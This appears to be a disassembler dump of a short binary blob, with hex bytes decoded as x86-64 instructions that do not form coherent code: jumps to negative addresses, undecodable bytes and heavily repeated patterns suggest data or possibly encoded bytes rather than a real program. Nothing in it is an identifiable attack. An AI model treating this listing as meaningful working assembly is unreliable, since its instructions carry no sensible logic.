00000000  728E              jc 0xffffffffffffff90
00000002  9F                lahf
00000003  7BD4              jpo 0xffffffffffffffd9
00000005  C9                leave
00000006  086408FC          or [rax+rcx-0x4],ah
0000000A  7D0A              jnl 0x16
0000000C  C4                db 0xc4
0000000D  7DA4              jnl 0xffffffffffffffb3
0000000F  818981810441F48B  or dword [rcx+0x41048181],0x81398bf4
         -3981
00000019  8181816806838181  add dword [rcx-0x7cf9977f],0xc40a8181
         -0AC4
00000023  7DA4              jnl 0xffffffffffffffc9
00000025  818181850441F48B  add dword [rcx+0x41048581],0x81398bf4
         -3981
0000002F  81818168F0838181  add dword [rcx-0x7c0f977f],0xc40a8181
         -0AC4
00000039  7DA4              jnl 0xffffffffffffffdf
0000003B  818101810441F58B  add dword [rcx+0x41048101],0x81398bf5
         -3981
00000045  81818168DA838181  add dword [rcx-0x7c25977f],0xc40a8181
         -0AC4
0000004F  7DA4              jnl 0xfffffffffffffff5
00000051  818183810441F48B  add dword [rcx+0x41048183],0x81398bf4
         -3981
0000005B  81818168C4838181  add dword [rcx-0x7c3b977f],0xc40a8181
         -0AC4
00000065  7DA4              jnl 0xb
00000067  8181A1810441F58B  add dword [rcx+0x410481a1],0x81398bf5
         -3981
00000071  81818168AE838181  add dword [rcx-0x7c51977f],0xc40a8181
         -0AC4
0000007B  7D02              jnl 0x7f
0000007D  61                db 0x61
0000007E  850441            test [rcx+rax*2],eax
00000081  F5                cmc
00000082  8B39              mov edi,[rcx]
00000084  81818181689A8381  add dword [rcx-0x65977e7f],0xa818183
         -810A
0000008E  C4                db 0xc4
0000008F  7DA4              jnl 0x35
00000091  818181830441F48B  add dword [rcx+0x41048381],0x81398bf4
         -3981
0000009B  8181816884838181  add dword [rcx-0x7c7b977f],0xc40a8181
         -0AC4
000000A5  7DA4              jnl 0x4b
000000A7  818081810441F58B  add dword [rax+0x41048181],0x81398bf5
         -3981
000000B1  818181686E808181  add dword [rcx-0x7f91977f],0xc40a8181
         -0AC4
000000BB  7DA4              jnl 0x61
000000BD  818191810441F58B  add dword [rcx+0x41048191],0x81398bf5
         -3981
000000C7  8181816858808181  add dword [rcx-0x7fa7977f],0xc40a8181
         -0AC4
000000D1  7DA4              jnl 0x77
000000D3  818581810441F58B  add dword [rbp+0x41048181],0x81398bf5
         -3981
000000DD  8181816842808181  add dword [rcx-0x7fbd977f],0xc40a8181
         -0AC4
000000E7  7DA4              jnl 0x8d
000000E9  018181810441      add [rcx+0x41048181],eax
000000EF  F4                hlt
000000F0  8B39              mov edi,[rcx]
000000F2  81818181682C8081  add dword [rcx+0x2c688181],0xa818180
         -810A
000000FC  C4                db 0xc4
000000FD  7DA4              jnl 0xa3
000000FF  818189810441F48B  add dword [rcx+0x41048189],0x81398bf4
         -3981
00000109  8181816816808181  add dword [rcx-0x7fe9977f],0xc40a8181
         -0AC4
00000113  7DA4              jnl 0xb9
00000115  818181C10441F48B  add dword [rcx+0x4104c181],0x81398bf4
         -3981
0000011F  8181816800808181  add dword [rcx-0x7fff977f],0xc40a8181
         -0AC4
00000129  7DA4              jnl 0xcf
0000012B  8181C1810441F58B  add dword [rcx+0x410481c1],0x81398bf5
         -3981
00000135  81818168EA808181  add dword [rcx-0x7f15977f],0xc40a8181
         -0AC4
0000013F  7D02              jnl 0x143
00000141  61                db 0x61
00000142  A10441F48B398181  mov eax,[qword 0x818181398bf44104]
         -81
0000014B  8168D68081810A    sub dword [rax-0x2a],0xa818180
00000152  C4                db 0xc4
00000153  7DA4              jnl 0xf9
00000155  818181910441F48B  add dword [rcx+0x41049181],0x81398bf4
         -3981
0000015F  81818168C0808181  add dword [rcx-0x7f3f977f],0xc40a8181
         -0AC4
00000169  7DA4              jnl 0x10f
0000016B  818181A10441F58B  add dword [rcx+0x4104a181],0x81398bf5
         -3981
00000175  81818168AA808181  add dword [rcx-0x7f55977f],0xc40a8181
         -0AC4
0000017F  7D02              jnl 0x183
00000181  61                db 0x61
00000182  91                xchg eax,ecx
00000183  0441              add al,0x41
00000185  F5                cmc
00000186  8B39              mov edi,[rcx]
00000188  8181818168968081  add dword [rcx-0x69977e7f],0xa818180
         -810A
00000192  C4                db 0xc4
00000193  7DA4              jnl 0x139
00000195  818185810441F48B  add dword [rcx+0x41048185],0x81398bf4
         -3981
0000019F  8181816880808181  add dword [rcx-0x7f7f977f],0xc40a8181
         -0AC4
000001A9  7DA4              jnl 0x14f
000001AB  818180810441F48B  add dword [rcx+0x41048180],0x81398bf4
         -3981
000001B5  818181686A818181  add dword [rcx-0x7e95977f],0xc40a8181
         -0AC4
000001BF  7DA4              jnl 0x165
000001C1  819181810441F58B  adc dword [rcx+0x41048181],0x81398bf5
         -3981
000001CB  8181816854818181  add dword [rcx-0x7eab977f],0xc40a8181
         -0AC4
000001D5  7DA4              jnl 0x17b
000001D7  818381810441F58B  add dword [rbx+0x41048181],0x81398bf5
         -3981
000001E1  818181683E818181  add dword [rcx-0x7ec1977f],0xc40a8181
         -0AC4
000001EB  7D02              jnl 0x1ef
000001ED  61                db 0x61
000001EE  C10441F5          rol dword [rcx+rax*2],byte 0xf5
000001F2  8B39              mov edi,[rcx]
000001F4  81818181682A8181  add dword [rcx+0x2a688181],0xa818181
         -810A
000001FE  C4                db 0xc4
000001FF  7D04              jnl 0x205
00000201  41F9              stc
00000203  8B39              mov edi,[rcx]
00000205  81818181681B8181  add dword [rcx+0x1b688181],0xa818181
         -810A
0000020F  C4                db 0xc4
00000210  7DA4              jnl 0x1b6
00000212  818181890441F48B  add dword [rcx+0x41048981],0x81398bf4
         -3981
0000021C  8181816805818181  add dword [rcx-0x7efa977f],0xc40a8181
         -0AC4
00000226  7DA4              jnl 0x1cc
00000228  81A181810441F586  and dword [rcx+0x41048181],0x813986f5
         -3981
00000232  8181816AF00AC47D  add dword [rcx+0xaf06a81],0x61027dc4
         -0261
0000023C  890441            mov [rcx+rax*2],eax
0000023F  F5                cmc
00000240  8639              xchg bh,[rcx]
00000242  818181816AE10AC4  add dword [rcx-0x1e957e7f],0xa47dc40a
         -7DA4
0000024C  810181810441      add dword [rcx],0x41048181
00000252  F5                cmc
00000253  8639              xchg bh,[rcx]
00000255  818181816ACC0AC4  add dword [rcx-0x33957e7f],0x27dc40a
         -7D02
0000025F  61                db 0x61
00000260  830441F4          add dword [rcx+rax*2],byte -0xc
00000264  8639              xchg bh,[rcx]
00000266  818181816ABD0AC4  add dword [rcx-0x42957e7f],0xa47dc40a
         -7DA4
00000270  818181800441F486  add dword [rcx+0x41048081],0x813986f4
         -3981
0000027A  8181816AA80AC47D  add dword [rcx+0xaa86a81],0x61027dc4
         -0261
00000284  800441F5          add byte [rcx+rax*2],0xf5
00000288  8639              xchg bh,[rcx]
0000028A  818181816A990AC4  add dword [rcx-0x66957e7f],0xa47dc40a
         -7DA4
00000294  81C181810441      add ecx,0x41048181
0000029A  F4                hlt
0000029B  8639              xchg bh,[rcx]
0000029D  818181816A843980  add dword [rcx-0x7b957e7f],0x81818039
         -8181
000002A7  81                db 0x81
000002A8  DC                db 0xdc
000002A9  42                rex.x
